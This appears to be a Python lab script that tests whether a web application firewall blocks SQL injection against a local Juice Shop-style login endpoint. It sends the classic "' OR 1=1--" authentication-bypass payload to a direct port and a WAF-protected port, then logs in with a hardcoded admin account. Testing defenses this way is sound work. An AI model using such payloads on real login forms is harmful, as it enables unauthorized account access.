import sys
import urllib.request
import urllib.error
import json

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8")

def test_login(port, email, password, label):
    url = f"http://localhost:{port}/rest/user/login"
    data = json.dumps({"email": email, "password": password}).encode("utf-8")
    req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
    print(f"=== {label} ===")
    print(f"URL: {url}")
    print(f"Payload: email={email!r}, password={password!r}")
    try:
        with urllib.request.urlopen(req) as resp:
            body = resp.read().decode("utf-8")
            data_resp = json.loads(body)
            user_data = data_resp.get("data", {})
            print(f"-> THÀNH CÔNG (Status: {resp.status})")
            print(f"-> Đăng nhập với tài khoản: {user_data.get('email', 'unknown')}, ID: {user_data.get('id')}\n")
    except urllib.error.HTTPError as e:
        print(f"-> BỊ CHẶN / THẤT BẠI (Status: {e.code} {e.reason})")
        print(f"-> Phản hồi: {e.read().decode('utf-8', errors='ignore')[:150]}\n")
    except Exception as ex:
        print(f"-> Lỗi: {ex}\n")

if __name__ == "__main__":
    # Test 1: Khong co WAF (port 3000) voi SQLi
    test_login(3000, "' OR 1=1--", "any_password", "KỊCH BẢN 1: Tấn công SQLi trực tiếp (Không qua WAF - port 3000)")

    # Test 2: Co WAF (port 8080) voi SQLi
    test_login(8080, "' OR 1=1--", "any_password", "KỊCH BẢN 2: Tấn công SQLi qua WAF (port 8080)")

    # Test 3: Co WAF (port 8080) voi tai khoan dung
    test_login(8080, "admin@juice-sh.op", "admin123", "KỊCH BẢN 3: Đăng nhập hợp lệ qua WAF (port 8080)")
